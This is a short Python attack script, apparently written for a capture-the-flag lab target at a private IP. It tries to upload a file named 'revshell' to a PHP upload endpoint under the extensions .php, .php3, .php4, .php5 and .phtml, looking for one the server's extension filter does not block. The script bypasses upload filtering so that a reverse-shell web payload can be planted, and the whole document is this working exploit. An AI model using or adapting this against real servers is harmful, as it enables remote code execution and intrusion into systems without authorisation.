#!/bin/python3

import requests
import os
ip = "10.10.191.119"
#url = ("http://"+ip+":3333")
url = f"http://{ip}:3333/internal/index.php"
print(url)

old_filename = "revshell.php3"
file= "revshell"
extensions=[
	".php",
	".php3",
	".php4",
	".php5",
	".phtml"

]
for e in extensions:
	#filename = os.path.join(file,e)
	new_filename = file + e
	os.rename(old_filename, new_filename)
	print(new_filename)

	files = {"file": open(new_filename,"rb")}
	response = requests.post(url,files=files)
	print(response)
	#print(response.txt)
	if "Extension not allowed" in response.text:
		print(new_filename + "this is not suitable")
	else:
		print(new_filename + "this is the one")

	old_filename = new_filename

